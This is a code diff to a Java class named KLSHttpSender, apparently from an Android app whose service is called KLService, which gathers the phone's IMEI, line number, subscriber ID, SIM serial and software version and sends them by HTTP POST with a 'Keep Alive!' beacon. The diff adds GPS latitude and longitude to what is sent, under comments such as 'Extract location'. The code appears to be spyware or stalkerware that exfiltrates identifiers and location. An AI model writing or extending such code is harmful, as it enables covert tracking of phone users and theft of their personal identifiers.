@@ -66,8 +66,9 @@ public class KLSHttpSender {
 	        Date date = new Date(dateTaken);
 	        SimpleDateFormat dateFormat = new SimpleDateFormat("d/MM/y_H:m:s");
 	        nameValuePairs.add(new BasicNameValuePair("TimeStamp", dateFormat.format(date)));
+	        
+	        //Extract Telephony stuff:
 		    if (Long.parseLong(mTelephonyManager.getDeviceId()) > 0) {
-			    nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
 			    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
 			    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
 			    nameValuePairs.add(new BasicNameValuePair("Line 1 Number", mTelephonyManager.getLine1Number()));
@@ -76,10 +77,15 @@ public class KLSHttpSender {
 			    nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
 			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));
 		    }
-		    else {
-		    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
-		    	nameValuePairs.add(new BasicNameValuePair("Alive: ", "Keep Alive!"));
+		    
+		    //Extract location:
+		    if (KLService.mLocation != null) {
+		    	nameValuePairs.add(new BasicNameValuePair("Location", "Lat=" + KLService.mLocation.getLatitude() + "Lon=" + KLService.mLocation.getLongitude()));
 		    }
+		    
+	    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
+	    	nameValuePairs.add(new BasicNameValuePair("Alive: ", "Keep Alive!"));
+		    
 		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
 		    // Execute HTTP Post Request
